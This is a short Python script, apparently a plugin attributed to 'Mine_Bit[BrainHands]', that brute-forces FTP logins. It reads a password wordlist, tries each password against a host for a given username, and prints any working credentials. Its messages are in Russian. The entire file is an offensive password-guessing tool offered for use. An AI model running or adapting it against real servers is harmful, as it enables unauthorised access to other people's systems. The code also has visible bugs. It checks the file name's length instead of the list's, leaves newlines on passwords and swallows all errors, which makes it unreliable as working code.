import sys
from ftplib import FTP

# -*- coding: utf-8 -*-
# Coded by Mine_Bit[BrainHands]
# brainhands.ru
# mine_bit@brainhands.ru

# Системные переменные:
__name__ = 'ftp_bruteforse'
__author__ = 'Mine_Bit'
__file__ = 'ftp_bruteforse.py'
__package__ = 'plugins'


def ftp_brute(host, username, passwords_file):
    try:
        passwords = open(passwords_file, "r").readlines()
    except IOError:
        print('[Ошибка] Не удалось найти файл с паролями!')
        sys.exit(1)
    if len(passwords_file) == 0:
        print('[Ошибка] Файл с паролями пуст!')
        sys.exit(1)
    for password in passwords:
        try:
            print('Пробуем пароль: ', password)
            ftp = FTP(host)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            print('[!] Комбинация найдена:')
            print('[!] Имя пользователя: ' + username)
            print('[!] Пароль: ' + password)
            ftp.quit()
            break
        except:
            print('Пароль не подошел, или проблема с другими данными')

    else:
        print('[!] К сожалению, ни один из паролей не подошел, или проблема с другими данными!')
